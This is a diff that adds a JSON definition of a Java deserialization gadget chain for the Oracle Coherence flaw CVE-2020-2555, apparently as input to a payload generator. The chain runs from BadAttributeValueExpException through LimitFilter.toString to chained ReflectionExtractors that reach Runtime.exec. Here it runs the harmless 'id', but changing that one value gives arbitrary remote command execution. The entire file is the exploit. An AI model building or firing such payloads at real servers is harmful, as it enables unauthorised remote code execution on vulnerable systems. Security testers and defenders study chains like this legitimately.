@@ -1,0 +1,47 @@
+{
+  "chain_type": "Coherence CVE-2020-2555 — LimitFilter toString trigger",
+  "root_class": "javax.management.BadAttributeValueExpException",
+  "root_trigger": "readObject→val.toString→LimitFilter.toString→extract",
+  "links": [
+    {
+      "class": "com.tangosol.util.filter.LimitFilter",
+      "field_overrides": {
+        "m_comparator": {"$ref": "link:1"},
+        "m_oAnchorTop": "java.lang.Runtime",
+        "m_oAnchorBottom": null
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ChainedExtractor",
+      "field_overrides": {
+        "m_aExtractor": [
+          {"$ref": "link:2"},
+          {"$ref": "link:3"},
+          {"$ref": "link:4"}
+        ]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "getMethod",
+        "m_aoParam": ["getRuntime", []]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "invoke",
+        "m_aoParam": [null, []]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "exec",
+        "m_aoParam": ["id"]
+      }
+    }
+  ],
+  "sink_method": "Runtime.exec"
+}
